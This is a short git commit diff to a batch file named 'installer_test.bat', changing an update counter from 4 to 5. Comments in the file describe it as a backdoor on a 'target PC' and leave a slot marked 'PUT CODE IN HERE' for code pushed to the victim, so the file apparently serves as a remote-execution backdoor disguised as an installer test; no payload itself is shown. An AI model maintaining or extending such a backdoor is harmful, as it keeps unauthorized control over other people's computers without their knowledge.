d2c41ea65393eaa09ea1b2113cbb986ea8bedff5
Luke Nicholls <57662212+Guest257351@users.noreply.github.com>
2021-04-07 12:02:34 +0930

    Update installer_test.bat

--- installer_test.bat
+++ installer_test.bat
@@ -3,7 +3,7 @@ set number=1
   set /p number=
 )
 :: ADD 1 TO UPDATE TO RUN THE CODE ::
-set update=4
+set update=5
 if %number% equ %update% (goto end)
 :: do not use the command exit, this will dissabled the backdoor on the target PC untill it is restarted
 :: PUT CODE IN HERE :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
